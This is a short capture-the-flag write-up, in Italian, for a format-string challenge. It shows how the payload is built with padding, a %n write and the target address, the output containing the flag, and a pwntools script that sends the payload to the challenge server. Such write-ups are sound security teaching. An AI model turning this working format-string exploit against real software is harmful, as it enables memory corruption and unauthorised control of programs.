Il printf smette di stampare quando incontra il byte nullo.

Per questo motivo è necessario inserire l'indirizzo di answer alla fine del nostro payload, e raggiungerlo attraverso un format del genere %G$p, dove G è un numero naturale.

In questo caso ho trovato l'indirizzo di `answer` da objdump, con `objdump -t ./the_answer`.

Poi ho creato il payload t.c.:
`[padding per raggiungere 42 - 1][formatstring %n][altro padding per centrare l'address][address di answer]`

In realtà il primo padding è di 41 perché prima del formatstring ho il carattere `|`.

Finché non centro l'address di answer uso `%p` per leggere cosa succede; quando raggiungo una situazione del genere ...

```
Hi, BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB|0x601078|AAAAAAAAAAAAAAAAx\x10`
```

... posso sostituire `%p` con `%n` ottenendo di fatto la flag.

```
Hi, BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB||AAAAAAAAAAAAAAAAx\x10`Exactly! Here's your flag:\nCCIT{50 LoNg, & Thanks for 4ll tH3 F1sh}
```


Codice dell'exploitation:

```python
from pwn import *

c = remote("answer.challs.cyberchallenge.it", 9122)
context.update(arch = "amd64")

# break all'istruzione compare con il 42 (0x2a)
# pid = gdb.attach(c, '''b *0x4008d6''')

c.recvuntil(b"\n")

payload = b"B" * 41 + b"|%18$n|" + b"A" * 16 + p64(0x0000000000601078)

c.sendline(payload)

print(c.recvall())

```